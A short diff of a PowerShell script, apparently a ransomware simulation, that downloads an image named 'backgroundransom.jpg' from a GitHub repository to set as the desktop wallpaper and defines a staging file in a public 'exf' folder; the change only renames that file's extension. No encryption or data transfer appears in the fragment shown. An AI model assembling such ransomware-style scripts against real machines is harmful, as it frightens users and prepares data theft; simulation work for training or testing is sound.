@@ -1,6 +1,6 @@
 $url = "https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg";
 $wallpaperPath = "$Env:UserProfile\AppData\Local\wallpaper.jpg";
-$Exf_File = "$env:PUBLIC\exf\Download_back.log";
+$Exf_File = "$env:PUBLIC\exf\Download_back.txt";
 
 add-type @"
 using System;
